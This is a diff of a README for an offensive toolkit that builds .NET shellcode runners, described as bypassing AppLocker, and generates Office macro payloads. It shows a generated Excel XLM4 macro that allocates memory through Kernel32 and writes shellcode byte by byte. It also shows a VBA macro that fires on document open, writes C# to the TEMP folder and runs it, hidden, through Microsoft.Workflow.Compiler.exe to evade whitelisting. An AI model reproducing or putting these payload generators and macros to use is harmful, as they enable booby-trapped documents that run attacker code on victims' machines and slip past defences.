@@ -1,4 +1,15 @@
 ## Build and compile .NET payload on linux with mono
+Compile a shellcode runner exe or generate source to bypass Applocker using various methods.  
+
+### Install 
+`python3 -m venv env`  
+`source env/bin/activate`  
+`python -m pip install pycryptodome`  
+`python builder.py -inbin test.bin --arch x64 --pretty`  
+Exec the resulting `out.exe` file on a windows machine.  
+
+Requires the `mono` package.  
+
 
 ```
 usage: builder.py [-h] [-inbin INBIN] [--arch {x86,x64}] [--outfile OUTFILE] [--type {exe,workflowcompiler,msbuild,installutil}] [--verbose VERBOSE] [--pretty PRETTY]
@@ -17,9 +28,29 @@ optional arguments:
   
 
 ## Using the macro helper  
+Creating office macro payloads can be tedious so I created this tool to ease the burden.  
+Generate source for word (2016) macro from a Program.cs.  
+Generate XLM4 macro pasta given some shellcode.  
+Note: only x86 (right now) and no null bytes.
+
+Generate XLM4 macro:  
+```
+usage: macro_helper.py [-h] [-infile INFILE] [--outfile OUTFILE] [--filename FILENAME] [--type {word_macro,xlm4_macro}] [--exectype {shell,wmi}] [--verbose VERBOSE]
+
+help create office macro
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -infile INFILE        bin file or Program.cs file depending on type
+  --outfile OUTFILE
+  --filename FILENAME
+  --type {word_macro,xlm4_macro}
+  --exectype {shell,wmi}
+  --verbose VERBOSE
+```
 
 ```
-/m/h/P/buildCS # ❯❯❯ python3 macro_helper.py -infile test.bin --type xlm4_macro
+python3 macro_helper.py -infile test.bin --type xlm4_macro
 
 =IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(R2C1),GOTO(R16C1))
 =REGISTER("Kernel32","VirtualAlloc","JJJJJ","Valloc",,1,9)
@@ -43,3 +74,44 @@ optional arguments:
 =CHAR(0xbb),&CHAR(0x47),&CHAR(0x13),&CHAR(0x72),&CHAR(0x6f),&CHAR(0x6a),&CHAR(0x0),&CHAR(0x59),&CHAR(0x41),&CHAR(0x89),&CHAR(0xda),&CHAR(0xff),&CHAR(0xd5),&CHAR(0x43),&CHAR(0x3a),&CHAR(0x5c),&CHAR(0x57),&CHAR(0x69),&CHAR(0x6e),&CHAR(0x64),&CHAR(0x6f),&CHAR(0x77),&CHAR(0x73),&CHAR(0x5c),&CHAR(0x53),&CHAR(0x79),&CHAR(0x73),&CHAR(0x74),&CHAR(0x65),&CHAR(0x6d),&CHAR(0x33),&CHAR(0x32),&CHAR(0x5c),&CHAR(0x6e),&CHAR(0x6f),&CHAR(0x74),&CHAR(0x65),&CHAR(0x70),&CHAR(0x61),&CHAR(0x64),&CHAR(0x2e),&CHAR(0x65),&CHAR(0x78),&CHAR(0x65),&CHAR(0x0),&CHAR(0x0)
 ```
 
+## Generate vba for office  
+
+```
+python3 macro_helper.py -infile Program.cs
+
+Function writeTestDotTXT()
+  strPath = Environ("TEMP") + "\brax.txt"
+  Dim fso As Object
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  Dim oFile As Object
+  Set oFile = fso.CreateTextFile(strPath)
+  oFile.WriteLine "using System;"
+  oFile.WriteLine "using System.Runtime.InteropServices;"
+  oFile.WriteLine "using System.Security.Cryptography;"
+  oFile.WriteLine "using System.IO;"
+  oFile.WriteLine "namespace ze"
+  oFile.WriteLine "{"
+  oFile.WriteLine "    class Program"
+  oFile.WriteLine "    {"
+  oFile.WriteLine "        [StructLayout(LayoutKind.Sequential)]"
+  oFile.WriteLine "        public struct SECT_DATA"
+  oFile.WriteLine "        {"
+  oFile.WriteLine "            public Boolean isvalid;"
+
+  <SNIP>
+
+  writeRunDotXML
+  tt = Environ("TEMP") +  "\brax.txt"
+  rx = Environ("TEMP") +  "\run.xml"
+  rs = Environ("TEMP") + "\res"
+  Shell "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe " + rx + " " + rs, vbHide
+End Function
+  
+
+Sub Document_Open()
+  bypass
+End Sub
+Sub AutoOpen()
+  bypass
+End Sub
+```
